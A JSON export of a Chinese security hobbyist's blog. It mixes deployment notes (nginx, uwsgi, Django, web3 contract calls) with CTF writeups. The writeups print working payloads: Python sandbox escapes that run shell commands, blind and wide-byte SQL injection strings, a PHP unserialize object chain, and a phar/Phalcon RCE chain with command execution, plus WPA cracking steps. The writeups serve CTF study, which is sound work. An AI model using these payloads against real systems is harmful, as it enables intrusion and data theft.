{"pages":[{"title":"About ME","text":"网络安全爱好者 CTFer","link":"/about/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"【笔记】部署nodejs+socket.io+nginx (https)","text":"&emsp;&emsp;此文记录一下nodejs+nginx部署的方案。 &emsp;&emsp;首先在服务端假如使用了socket.io，并且相关代码如下：1234567891011121314const express = require('express');global.express = express;global.app = express();const io = require('socket.io');console.log('web server listen on 127.0.0.1:8000');let server = global.app.listen(8000, '127.0.0.1');global.io = io(server,{ upgrade: false, transports: ['websocket'], reconnection: true,});... &emsp;&emsp;此时我们将socket.io的监听绑定到express上，这样避免了重新开辟一条通路。 &emsp;&emsp;接着在/etc/nginx/conf.d/下创建一个站点的配置文件：123456789101112131415161718192021222324252627282930313233343536373839404142upstream www { server 127.0.0.1:8000;}server { listen 80; # 修改为自己的域名 server_name www.example.cn; # 301 重定向 return 301 https://www.example.cn$request_uri;}server { listen 443; server_name www.example.cn; ssl on; # 证书路径不要写错 ssl_certificate /etc/nginx/ssl/1_example.cn_bundle.crt; ssl_certificate_key /etc/nginx/ssl/2_example.cn.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE; ssl_prefer_server_ciphers on; if ($ssl_protocol = \"\") { rewrite ^(.*) https://$host$1 permanent; } location / { # WebSocket 配置 proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"upgrade\"; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Nginx-proxy true; # 这里也要修改为你的二级域名前缀 proxy_pass http://www; proxy_redirect off; }} &emsp;&emsp;检查配置文件是否正确：123$ sudo nginx -tnginx: the configuration file /etc/nginx/nginx.conf syntax is oknginx: configuration file /etc/nginx/nginx.conf test is successful &emsp;&emsp;重新启动Nginx：1sudo nginx -s reload &emsp;&emsp;此时我们就能使用HTTPS下的websocket了。 &emsp;&emsp;为了让我们的服务更加的稳定，可以使用pm2来管理node项目。1npm install pm2 -g &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/10/Nginx-nodejs-socket/"},{"title":"[随手记]记一次线上AWD的网络配置","text":"前言&emsp;&emsp;线下的AWD往往需要线上预选，而且频率也比较少，有空时可以玩玩线上的AWD模式，但涉及的一个问题就是虚拟组网，这篇主要记录下faustctf的线上AWD网络设置。 网络拓扑 &emsp;&emsp;首先这是官方的网络拓扑图，其相关说明如下：VPN routing networks: 10.65.&lt;team_ID&gt;.1: Competiton gateway 10.65.&lt;team_ID&gt;.2: Team routerTeam networks: 10.66.&lt;team_ID&gt;.0/24 Vulnbox: 10.66.&lt;team_ID&gt;.2 Competition infrastructure (flag submission etc.): 10.67.0.0/16&emsp;&emsp;team_ID是主办方发配给你的队伍id，同时主办方也会发放VPN供你连接比赛网络。其中一部分配置如下：123ifconfig 10.65.68.2 10.65.68.1route 10.66.0.0 255.255.0.0route 10.67.0.0 255.255.0.0&emsp;&emsp;可以看到10.66/67网段的已经添加进路由了。&emsp;&emsp;主办方的设置是：&gt;在我们的设置中，一台物理机将托管Vulnbox并充当您的个人VPN网关。所有的团队成员都将他们的个人电脑连接到团队网络，机器也作为网关。因此，团队成员可以联系您的Vulnbox，其他团队和互联网。&emsp;&emsp;要求是要拥有两块网口的PC，而我这里并没有两个网口，但我有一个openwrt的路由器，它提供了丰富的应用，其中就包含VPN。如果你已经有openwrt了，可以使用如下安装VPN：12opkg updateopkg install openvpn-openssl openvpn-easy-rsa&emsp;&emsp;在具体的操作可以参考：这个文章。开启可以用：1openvpn --config /etc/openvpn/yourconf.conf&emsp;&emsp;如果成功你可以看到新增了一个网卡： &emsp;&emsp;然后在路由器里已经可以ping通主办方的网关。 &emsp;&emsp;但我们使用的主机和vulnbox还不能接入网络，我们需要配置10.66.&lt;team_ID&gt;.0/24的网络，这个就简单了，在路由器的接口网络中选择10.66.68.1即可，如： &emsp;&emsp;配好以后我们就正式接入AWD的游戏网络了，我们可以ping主办方的NPC检查： &emsp;&emsp;此时，我们只要将vulnbox在虚拟机中起起来就行了，但由于虚拟机采用公私钥验证，启动虚拟机时需要我们输入主办方的私钥文件，但因为我们无法通过ssh上去，所以我们无法进行复制粘贴，这个问题我们可以通过串口通信来解决。 &emsp;&emsp;解决方法如下： &emsp;&emsp;1、在虚拟机中设置串口通信，选择命名管道，名字为：//./pipe/com_1： &emsp;&emsp;2、接着使用putty连接： &emsp;&emsp;这时我们就能实现ssh的功能了，可以进行复制粘贴了。 &emsp;&emsp;但遗憾的是接入没几分钟虚拟机就被打爆了，按照主办方的配置应该是： We suggest giving your VM at least 3 CPU cores and 6 GB of RAM. &emsp;&emsp;但我只能配2cpu + 2gRAM，远达不到要求，只能匆匆下线。不过题目初步看了一下是区块链相关的，很有意思，有兴趣可以跟一下wp。&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/06/awd-network/"},{"title":"2018 国赛ciscn writeup","text":"前言&emsp;&emsp;不想吐槽了，谁做谁知道，这篇文章只是记录下一些tips。 寻找入侵者12黑客使用无线钓鱼攻击一个SSID为“CyberPeace”的热点，但是我们的蜜罐系统捕获了他的数据包，并且已经得知他的握手包密码就是他的网卡地址。可是根据我们最新获得的情况，他又发送重连请求的Malformat Frame试图崩溃我们的无线路由器。请从attack包中找到密码，并解开他的数据包,找到那条畸形数据。 &emsp;&emsp;下载后有两个压缩包，一个是attack.pcapng，一个是hanshake.cap，按照题目的意思就是密码在attack.pcapng里的一个mac地址，然后用hanshake.cap验证该密码的正确性。那首先我们先去找一下密码，因为不会tshark，但是他能做的wireshark也能，可能就是实现的方式的效率问题。。。 &emsp;&emsp;如何提取mac地址？在wireshark的操作如下：统计 –&gt; 端点，打开后在Endpoint类型里勾上IEEE 802.11，就能出现如下画面： &emsp;&emsp;然后点击复制 –&gt; 作为CSV就能将所有的mac地址提取出来，当然你还需要清理下数据，写个Python小脚本即可。&emsp;&emsp;将得到的密码本拿去验证一下：1aircrack-ng hanshake.cap -w password.txt&emsp;&emsp;最后得到密码。 &emsp;&emsp;有了密码后我们就能解开hanshake.cap里的数据，这个跟前面用到过的解https的方式类似，都是需要导入秘钥。但IEEE 802.11的导入方式不同，因为是它用的是wpa/wpa2的加密方式，所以我们需要将秘钥转换成wpa-psk的格式，wireshark提供了这个工具：传送门。按照要求填入信息就能得到wpa-psk，如： &emsp;&emsp;拿到psk后，在wireshark里如下操作：1编辑 ---&gt; 首选项 ---&gt; Protocols ---&gt; IEEE 802.11 &emsp;&emsp;这样我们就能看到数据包了，然后追踪流，比较可疑的是发现了一个key.rar。 &emsp;&emsp;因为是在线了，我们可以自己下下来看看，比赛的时候也止步于此了，因为下下来发现跟attack.pcapng差不多，而且报文还很多，就猜想flag可能不在这，然而看了writeup后才发现flag就在这个包，出题人真会玩，都到了这一步了，线索还不给得清晰点。&emsp;&emsp;在那个key.pcap里搜索一下flag，就能出现了，但因为比赛结束停止了提交，而且其他博客又没有放出flag，所以就自己熟悉一下好了。1wlan matches &quot;flag&quot; RUN&emsp;&emsp;其实我最想记录的是这道题，这是道python的沙箱逃逸。比较有趣，以前也没接触过，网上找了一些payload但都因为绕不过关键字而被ban掉。 &emsp;&emsp;因为它过滤了一些危险函数，比如：os、sys等，但我们可以通过类的继承关系找到被ban掉的库，然后将它导入进来。我们可以先看一下payload的前半部分：1().__class__.__bases__[0].__subclasses__() &emsp;&emsp;从代码上我们比较好理解，就是从()找到它的父类也就是__bases__[0]，而这个父类就是Python中的根类&lt;type 'object'&gt;，它里面有很多的子类，包括file等，这些子类中就有跟os、system等相关的方法，所以，我们可以从这些子类中找到自己需要的方法。 &emsp;&emsp;知道了上面的基础后，我们可以找到一些payload，比如：12345678//读文件().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read()//写文件().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')//执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls /var/www/html\").read()' ) &emsp;&emsp;但这道题的突破点是在获得类的属性上，从网上找的payload中存在一些被ban掉的关键字，如func_globals中存在ls，这也是做题时卡着的地方。而这些都可以用__getattribute__进行突破，它的用法如下： &emsp;&emsp;可以看到通过__getattribute__我们可以传字符串来进行方法的调用，这就是我们需要的，然后我们将网上找的payload改造一下：1().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['popen']('l'+'s').read() &emsp;&emsp;因为它没有回显，所以我们只能通过print来获得返回的信息。最终我们拿到flag。在网上找的时候看到了另一种获得方法的函数：1getattr(().__class__.__bases__[0].__subclasses__()[59]().__module.__builtins__['__import__']('o'+'s'), 's'+'yst'+'em')('ls') &emsp;&emsp;它是通过getattr()来实现的，但在本题的环境中这个payload并不能用。相关的参考链接： &emsp;&emsp;https://blog.csdn.net/qq_35078631/article/details/78504415&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/05/ciscn-writeup/"},{"title":"pragyan ctf writeup","text":"前言&emsp;&emsp;这场CTF由于时间紧张，所以只做了web题，比赛中也只做出两题，其余两题为比赛结束后参考writeup进行复现并记录。 1、web1：Unfinished business &emsp;&emsp;自己做的时候没做出来，用的是burp suite抓包，但没看出什么东西，然后再看别人的writeup复现。登陆的时候勾选admin，然后用owasp zap抓包看一下，也正是这个工具在这题中运用得比较好。很容易就看到了flag。 &emsp;&emsp;所以flag：pctf{y0u=Sh0Uldn’1/h4v3*s33n,1his.:)} 2、web2：Authenticate your way to admin &emsp;&emsp;关键点在于它在还没验证账号是否正确的情况下将identifier存入$_SESSION[‘id’]。 &emsp;&emsp;所以，第一次我们用正常的账号密码登陆以绕过homepage.php的登陆检验。 &emsp;&emsp;然后第二次我们用admin登陆，这里虽然会返回错误，但在上面已经提到，它是在验证前就更新了$_SESSION[‘id’]。 &emsp;&emsp;所以，再次刷新原来登陆后的页面时，你的$_SESSION[‘id’]就被替换成了admin。最终拿到flag。 &emsp;&emsp;所以flag：pctf{4u1h3ntic4Ti0n.4nd~4u1horiz4ti0n_diff3r} 3、web3：El33t Articles Hub&emsp;&emsp;这道题比赛时也没解出来，现在拿着writeup复现一下。 &emsp;&emsp;上来看到这个猜测十有八九就是文件包含，但将常见的文件包含跟绕过试了一遍都没有结果。所以这道题就进展不下去。 &emsp;&emsp;看到writeup后才发现关键点不在这个url，在查看网页源代码的时候会发现两个带下划线的url，经自己不成熟总结，一般这样的链接都有猫腻。。。而且可以发现标题的图标也一直在变，仿佛在提醒你。。。 &emsp;&emsp;做题的时候直接访问是一张正常的图片，但将id=x代入，并且查看源代码时，你就会发现hint。 &emsp;&emsp;发现这又是一个文件包含，并且能包含php。所以查看index.php的代码。 &emsp;&emsp;helpers.php的代码 &emsp;&emsp;此时就能清晰的看到flag的位置，但因为id这里不能包含txt文件，所以只能回到file包含里。然后构造payload：1.....///secret/./flag_7258689d608c0e2e6a90c33c44409f9d &emsp;&emsp;故flag：pctf{1h3-v41id41i0n_SuCk3d~r34l-baD} 4、web4：Animal Spy Database1Poc：1&apos; or 1=1 -- +（返回正确）；1&apos; or 1=2 -- +（返回错误） &emsp;&emsp;说明有注入，再进一步可以测出是盲注。 &emsp;&emsp;其实，你测到后面会发现，题干中已经给了你表名，字段了。 &emsp;&emsp;当然，你也可以用12345678查询数据库长度：1&apos; or (length(database()))=12 -- +数据库：1&apos; or (ascii(substr(database(),1,1)))&gt;100 -- +表名：1&apos; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100 -- +字段：1&apos; or (ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))&gt;100 -- + &emsp;&emsp;所以最终的Payload：11&apos; or (ascii(substr(( select username from users limit 0,1),1,1)))&gt;68 -- + &emsp;&emsp;注入出username字段的值就是admin。 &emsp;&emsp;再将password注入出来，Payload：11&apos; or (ascii(substr(( select password from users limit 0,1),1,1)))&gt;68 -- + &emsp;&emsp;所以最终flag：pctf{L31‘s~@Ll_h4il-1h3-c4T_Qu33n.?}","link":"/2018/03/Pragyan-CTF-Writeup/"},{"title":"【BlockChain】 调用智能合约的方法","text":"前言&emsp;&emsp;本文主要讲调用已部署的智能合约的几种方法，以Capture The Ether网站为例，调用测试链为Ropsten。 使用remix-ide&emsp;&emsp;remix-ide是Browser-Only Solidity IDE and Runtime Environment。能够帮助我们调试合约代码。在本地搭建好后可以直接使用浏览器打开访问。 &emsp;&emsp;这里以CTE里的一道题为例子。 &emsp;&emsp;代码如下：123456789pragma solidity ^0.4.21;contract CallMeChallenge { bool public isComplete = false; function callme() public { isComplete = true; }} &emsp;&emsp;目的是调用ropsten里的callme。 &emsp;&emsp;点击开始后会得到一个合约地址： &emsp;&emsp;我们把代码放到remix-ide里，并进行编译 &emsp;&emsp;在Run标签栏里，填好所需的信息，如环境，合约地址，最后能看到在ropsten里部署好的合约： &emsp;&emsp;点击callme，在console里会输出log信息，并给出是否成功。 &emsp;&emsp;此时，回到题目，点击检查。即可通过这关。 &emsp;&emsp;使用remix-ide只能满足简单的交互要求，如果交互频繁，则可以选择更为灵活的代码实现。 web3py&emsp;&emsp;web3py是web3.js在python上的实现，可以使用pip安装：1pip install web3 &emsp;&emsp;一个使用web3py简单交互的代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# -*- coding:utf-8 -*-from web3 import Web3, HTTPProviderfrom web3.contract import ConciseContractfrom web3.eth import Ethfalse = Falsetrue = Trueconfig = { \"abi\": [ { \"constant\": false, \"inputs\": [], \"name\": \"callme\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"constant\": true, \"inputs\": [], \"name\": \"isComplete\", \"outputs\": [ { \"name\": \"\", \"type\": \"bool\" } ], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" } ], \"address\": \"0x1933fEa88E2295e7b7A5523A86CE69742794DaA8\" # 合约地址}INFURA_API_KEY=\"your_key\"ROPSTEN_URL = \"https://ropsten.infura.io/%s\" %INFURA_API_KEYweb3 = Web3(HTTPProvider(ROPSTEN_URL))contract_instance = web3.eth.contract(address=config['address'], abi=config['abi'])MY_ADDR = \"0x901B1bDE...\" # 你的地址PRIV_KEY = \"0x1dc7...\" # 你的私钥def SendTxn(txn): signed_txn = web3.eth.account.signTransaction(txn, private_key=PRIV_KEY) res = web3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = web3.eth.waitForTransactionReceipt(res) # print(res) return txn_receipttxn = contract_instance.functions.callme().buildTransaction( { 'chainId': 3, #ropsten, 1 for main 'nonce': web3.eth.getTransactionCount(MY_ADDR), 'gas': 7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice': web3.eth.gasPrice, })print(SendTxn(txn)) &emsp;&emsp;要实例化一个合约，需要abi和合约地址两个参数，abi可以在remix-ide里获取到。 &emsp;&emsp;另外，使用web3的过程中我们需要连接到以太坊节点，如HTTPProvider。如果自己本地没有搭建好节点，那么可以使用第三方提供的节点，如infura。注册好后可以得到一个app key，使用该key就能连入infura提供的节点。 &emsp;&emsp;实例化contract以后我们可以使用contract_instance.functions.callme()的方法调用合约内的函数。因为我们需要实际改变ropsten链的值，所以我们需要创建一个交易，完成对ropsten的通信，所以还需调用buildTransaction方法。最后把签完名的交易块发送到ropsten链上。 web3.js&emsp;&emsp;web3.js是官方提供的库。其调用代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647let Web3 = require(\"web3\");let Tx = require('ethereumjs-tx');// 合约地址let contractAddress = \"0x799Caa8d82d70296f1eA4992B76553ABD72da9B1\";// 创建web3对象let web3 = new Web3();// 连接到 ropsten 测试节点let INFURA_API_KEY=\"************\"let ROPSTEN_URL = \"https://ropsten.infura.io/\" + INFURA_API_KEYweb3.setProvider(new Web3.providers.HttpProvider(ROPSTEN_URL))let fromAddress = \"0x901B1bDE...\";let count = web3.eth.getTransactionCount(fromAddress);let gasPrice = web3.eth.gasPrice;let gasLimit = 90000;let rawTransaction = { \"from\": fromAddress, \"nonce\": web3.toHex(count), \"gasPrice\": web3.toHex(gasPrice), \"gasLimit\": web3.toHex(gasLimit), \"to\": contractAddress, \"value\": \"0x0\", \"data\": \"0xa3c8e393\",};// 读取私钥，这里不包含‘0x’两个字符let privKey = new Buffer.from('1dc72....', 'hex');let tx = new Tx(rawTransaction);// 用私钥签名交易信息tx.sign(privKey);let serializedTx = tx.serialize();// 发送交易web3.eth.sendRawTransaction('0x' + serializedTx.toString('hex'), function(err, hash) { if (!err) console.log(hash); else console.log(err);}); &emsp;&emsp;如上，这里我们要重点关注rawTransaction里的data段。 &emsp;&emsp;它是所调函数的函数声明做keccak256（即sha3）的哈希，并取前4个字节组成。如果需要传递参数，则把需要传递的参数转换成16进制，并在前面填满32字节（64位）。然后跟函数签名拼接而成。 &emsp;&emsp;相关的说明我们可以参考： &emsp;&emsp;https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI#examples &emsp;&emsp;https://github.com/linjie-1/guigulive-operation/wiki/Ethereum%E7%9A%84%E5%90%88%E7%BA%A6ABI%E6%8B%93%E5%B1%95#abi%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8&emsp;&emsp;&emsp;&emsp;","link":"/2018/09/cte-writeup/"},{"title":"2018 DDCTF web 注入的奥妙 writeup","text":"注入的奥妙&emsp;&emsp;在网页的源码里发现了一处注释 &emsp;&emsp;打开后发现是BIG5编码表，所以推测是宽字节注入。 &emsp;&emsp;因为页面的属性是UTF-8 &emsp;&emsp;所以推测后端应该是做了类似这个：iconv('utf-8','BIG5',$_GET['id'])的转换。又因为'会被转义，变成\\'，所以我们考虑找一个BIG5编码后最后一位是5C的字符，这样查询时就变成\\\\'把\\的作用取消掉。然后我们可以在字符查询网站找一下，传送门。 &emsp;&emsp;这是随便找的一个，当然，还有很多个符合条件的字。 &emsp;&emsp;然后成功拿到POC &emsp;&emsp;而且还是报错注入，这算是注入中效率比较高的一种方法了，然后注入的时候注入被过滤的函数，双写绕过即可。payload：1http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/well/getmessage/1廄&apos;and updupdatexmlatexml(1,concat(0x7e,substr((select rulepass from route_rules limit 0,1),1,30),0x7e),1) -- + &emsp;&emsp;具体的注入过程不再赘述。最后我们能拿到如下的表结构和键值。1234567891011121314151617181920212223database ---&gt; sqlitable ---&gt; message id name contents route_rules id pattern get*/:u/well/getmessage/:s get*/:u/justtry/self/:s post*/:u/justtry/try static/bootstrap/css/backup.css action Well#getmessage JustTry#self JustTry#try static/bootstrap/css/backup.zip rulepass cd4229e671a8830debfcbb049a23399c 5ed16f9c7c27cb846eaf15c19fe40093 3228ad498d5a20d1d22d6a4a15fed4d2 &emsp;&emsp;很明显有一个备份文件，又是源码泄露。下载下来慢慢审计。 &emsp;&emsp;首先这是php的mvc设计模式，由Router.php负责分发，然后在Justtry类上，也就是我们从注入上得到的可以操作的类上发现了我们非常感兴趣的东西：序列化与反序列化，所以一个清晰地念头就出来了。1234567891011121314151617181920212223242526272829303132&lt;?phpclass Justtry extends Base{ private $white = array('test', 'well','base','justtry'); public $flag; public function __construct() { parent::__construct(); } public function self($a='') { if (!in_array(strtolower($a), $this-&gt;white)) { exit('类不存在'); } $res=$this-&gt;ref-&gt;getclassall($a); if (isset($res)) { echo $res; } } public function try($serialize) { unserialize(urldecode($serialize), [\"allowed_classes\" =&gt; [\"Index\\Helper\\Flag\", \"Index\\Helper\\SQL\",\"Index\\Helper\\Test\"]]); } public function send() { //省略 }} &emsp;&emsp;我们可以发现允许序列化的类只有：Flag、SQL、Test，所以我们重点关注一下这三个类，寻找获取flag的条件。123456789101112131415161718192021222324252627282930313233// Test.php&lt;?phpclass Test{ public $user_uuid; public $fl; public function __construct() { echo 'hhkjjhkhjkhjkhkjhkhkhk'; } public function __destruct() { $this-&gt;getflag('ctfuser', $this-&gt;user_uuid); } public function setflag($m = 'ctfuser', $u = 'default', $o = 'default') { // 省略 } public function getflag($m = 'ctfuser', $u = 'default') { //TODO: check username // 需要知道id $user=array( 'name' =&gt; $m, 'id' =&gt; $u ); //懒了直接输出给你们了 echo 'DDCTF{'.$this-&gt;fl-&gt;get($user).'}'; }} &emsp;&emsp;可以看到Test类的__destruct()调用了getflag()，所以推测这是我们序列化的入口。而它里面调用的get($user)方法是属于Flag类的。123456789101112131415161718// Flag.php&lt;?phpclass Flag{ public $sql; public function __construct() { $this-&gt;sql=new SQL(); } public function get($user) { $tmp=$this-&gt;sql-&gt;FlagGet($user); if ($tmp['status']===1) { return $this-&gt;sql-&gt;FlagGet($user)['flag']; } }} &emsp;&emsp;截取SQL类的FlagGet()方法：1234567891011121314151617181920&lt;?phppublic function FlagGet($user) { $this-&gt;dbc = new FLDbConnect(); $this-&gt;pdo = $this-&gt;dbc-&gt;getPDO(); //TODO :CHECK UNIQUE $user['name']= $user['name']; $user['id']= $user['id']; $sth = $this-&gt;pdo-&gt;prepare('SELECT `username`,`flags`,`uuid` FROM `passflag` WHERE `uuid` = :uuid AND `username` = :name'); $sth-&gt;bindValue(':uuid', $user['id'], $this-&gt;pdo::PARAM_STR); $sth-&gt;bindValue(':name', $user['name'], $this-&gt;pdo::PARAM_STR); if ($sth-&gt;execute()) { $result = $sth-&gt;fetch($this-&gt;pdo::FETCH_ASSOC); return array('status'=&gt;1,'msg'=&gt;'success','flag'=&gt; $result['flags']); } else { return array('status'=&gt;0,'msg'=&gt;implode(' ', $this-&gt;pdo-&gt;errorInfo())); } } &emsp;&emsp;到这，我们可以初步确定Test类中的$fl属性的值为Flag类，但$user_uuid的值我们还不能确定，所以，我们来找找这个值。 &emsp;&emsp;在UUID.php里我们可以发现关于uuid的定义，它的形式如下： &emsp;&emsp;看到上面的形式然后再看看我们的url里面的4eaee5db-2304-4d6d-aa9c-962051d99a41，是不是很符合，所以我就大胆的试了一下，使用下面的脚本进行序列化：1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpnamespace Index\\Helper;class SQL{ public $dbc; public $pdo; public function __construct() { }}class Flag{ public $sql; public function __construct() { $this-&gt;sql=new SQL(); }}class Test{ public $user_uuid; public $fl; public function __construct() { echo 'hhkjjhkhjkhjkhkjhkhkhk'; }}$a = new Test;$a-&gt;fl = new Flag;$a-&gt;user_uuid = '4eaee5db-2304-4d6d-aa9c-962051d99a41';$b = serialize($a);echo $b;?&gt; &emsp;&emsp;注意：一定不要忘记namespace Index\\Helper，不然服务器序列化失败。 &emsp;&emsp;我们将得到的序列化结果先进行url encode一下，然后再提交。 &emsp;&emsp;最后flag：DDCTF{9b6b97fe2980c5ed24bdb980c8994d81a26a363e07d92fd74070ee63e5e40911}。","link":"/2018/04/ddctf-writeup3/"},{"title":"Defcamp(DCTF) 2018-Vulture phar反序列化攻击","text":"前言&emsp;&emsp;这是defcamp ctf 2018 vulture 的题解，使用的方法为利用phar拓展进行PHP反序列化攻击。 We created an online service where you can upload pictures of vultures (or other birds). Each user has a feed so you can privately enjoy the photos you took of this majestic killing machines :)Target: https://vulture.dctfq18.def.camp/Author: Anatol &emsp;&emsp;打开网站后发现是一个图片留言板一类的东西，用户可以上传一张图片和描述图片的文字。 &emsp;&emsp;经过测试后发现如果选择不存在的图片时会报Image not found的错误。所以这里很有可能使用了file_exists去检查文件是否存在。 &emsp;&emsp;在知道创宇的一篇文章中提到过利用phar进行反序列化攻击的例子（这里不再赘述，建议直接看原文。）。而他的利用条件是： &emsp;&emsp;在这道题中，题目的环境都满足利用条件。&emsp;&emsp;在利用反序列化过程中需要找好可以任意代码执行的类，很显然，以目前的条件我们还得不到这样一个类。&emsp;&emsp;当我们尝试访问一个不存在的页面时会爆出如下错误：1Exception: xxxController handler class cannot be loaded &emsp;&emsp;Google后可以发现这是一个叫Phalcon的PHP framework，而网上还有一个利器PHPGGC: PHP Generic Gadget Chains，它可以为我们生成ROP Gadget，类似于pwn。1项目地址：https://github.com/ambionics/phpggc&emsp;&emsp;而这个项目里就含有这个框架的gadget。 &emsp;&emsp;接下来我们修改gadgetchains/Phalcon/RCE/1/chain.php：1234567891011121314151617181920212223242526272829&lt;?phpnamespace GadgetChain\\Phalcon;class RCE1 extends \\PHPGGC\\GadgetChain\\RCE{ public $version = '&lt;= 1.2.2'; public $vector = '__wakeup'; public $author = 'Raz0r'; public $informations = ' This chain does not expect parameters, will eval() any code supplied in php://input (i.e. POST data). Requires allow_url_include = true. '; # No parameters expected public $parameters = []; public function generate(array $parameters) { @unlink('phar.phar'); $p = new \\Phar('phar.phar'); $p-&gt;startBuffering(); $p-&gt;setStub(\"GIF89a&lt;?php xxx; __HALT_COMPILER();?&gt;\"); $p-&gt;addFromString(\"test.txt\", \"test\"); $p-&gt;setMetadata(new \\Phalcon\\Logger\\Adapter\\File()); $p-&gt;stopBuffering(); return new \\Phalcon\\Logger\\Adapter\\File(); }}&emsp;&emsp;使用./phpggc Phalcon/RCE1得到exp： &emsp;&emsp;可以看到生成的phar文件变成了GIF。我们将这个文件上传上去： &emsp;&emsp;这里注意到结果是false但这并不影响我们使用，实际上已经上传成功了。&emsp;&emsp;接着根据phpggc的提示:12This chain does not expect parameters, will eval() any code supplied in php://input (i.e. POST data). Requires allow_url_include = true.&emsp;&emsp;所以我们只需在post body里写命令执行的代码即可：12&lt;?php die(`ls -la`);/*&amp;image=phar://uploads/5bb0ca3725e63.gif&amp;text=123 &emsp;&emsp;这里注意需要在image的前面加&amp;，不然会造成错误。接着我们直接cat flag即可。 参考链接&emsp;&emsp;https://paper.seebug.org/680/ &emsp;&emsp;https://cyku.tw/ctf-defcamp-qualification-2018/&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/09/defcamp-writeup2/"},{"title":"部署Django项目","text":"前言&emsp;&emsp;月初一直在忙于期末复习准备考试，导致博客处于断更状态，考完试后就忙于为“黑塔”项目增加爬虫，并将项目正式部署该项目。现在已经完成了初步的部署，所以是时候更新博客和记录部署时遇到的一些问题。其实，开个博客也是能很好的鞭策自己去学习东西，就是为了博客不处于断更状态。 目录 一：部署概述 二：收集项目中的静态文件 三：安装及配置uwsgi 四：安装及配置nginx 五：启动服务 六：部署中遇到的问题及解决方案 部署概述&emsp;&emsp;在本文中采用nginx + uwsgi的部署方案，这也是目前较为受欢迎的方案。先放一张整个系统的架构图： &emsp;&emsp;在这个方案中，nginx主要处理静态页面，而uwsgi处理动态页面，整个系统对外体现为nginx，当nginx发现请求的是动态页面时会将请求发送给uwsgi处理，这两者之间的通信桥梁可以是端口或者sock的形式，本文采用sock文件的形式，听说这种方式比端口通信更加有效。 收集项目中的静态文件&emsp;&emsp;很多博客里都把这一步放到最后，但这给刚学部署的人很不好的体验，使人对整个部署过程很模糊，所以我这里先收集项目中的静态文件。说明：静态文件的位置没有要求，收集静态文件的目的是让nginx更好的处理它，如果直接使用APP里的静态文件会导致后台Admin的css、js等无法加载，所以我们需要先收集静态文件。 &emsp;&emsp;在项目的setting.py中添加静态文件存放的目录，添加内容如下：123STATIC_URL = '/static/'# STATIC_ROOT就是静态文件的路径，可以自由设置，下面配置uwsgi、nginx需要使用到这个路径STATIC_ROOT = '/root/django/static/' &emsp;&emsp;在manage.py的目录下运行python manage.py collectstatic收集静态文件。 安装及配置uwsgi&emsp;&emsp;在django的python环境中执行：pip install uwsgi即可。 &emsp;&emsp;配置uwsgi，本文采用.ini的文件形式配置。新建一个新的文件夹，可以在任意位置。如本文中在与django项目同级的目录下新建一个名为：uwsgi的文件夹，名字可以任意取。 &emsp;&emsp;其中web是项目文件夹，uwsgi文件夹用来存放uwsgi的配置文件和日志等。 &emsp;&emsp;在uwsgi中新建一个uwsgi.ini的文件，具体内容如下：12345678910111213141516171819202122232425262728293031323334# uwsig使用配置文件启动[uwsgi]# 项目根目录，并非是app目录chdir=/root/django/web/# wsgi.py的路径，first是wsgi.py存在的目录名module=first.wsgi:application# 指定sock的文件路径，用来与nginx通信 socket=/root/django/uwsgi/uwsgi.sock# 进程个数 workers=4pidfile=/root/django/uwsgi/uwsgi.pid# 指定IP端口，这里可以用来测试uwsgi与django项目之间是否准确连接。调试好后可以注释掉# 如果开启了可以不用开启nginx服务而直接通过 ip:8080访问网页。 # http=192.168.2.108:8080# 这里使用上面收集的静态文件夹目录static-map=/static=/root/django/static# 启动uwsgi的用户名和用户组uid=junaygid=root# 启用主进程master=true# 自动移除unix Socket和pid文件当服务停止的时候vacuum=true# 序列化接受的内容，如果可能的话thunder-lock=true# 启用线程enable-threads=true# 设置自中断时间harakiri=30# 设置缓冲post-buffering=4096# 设置日志目录daemonize=/root/django/uwsgi/uwsgi.log &emsp;&emsp;上面配置文件的每一条都有详细的说明，请大家仔细阅读。这里需要注意的是，我为这个项目专门添加了一个junay的用户，并且将它添加到root用户组。后面我还是使用这个用户开启nginx服务。我们需要特别注意用户权限的问题，这个问题也困扰了我两天。 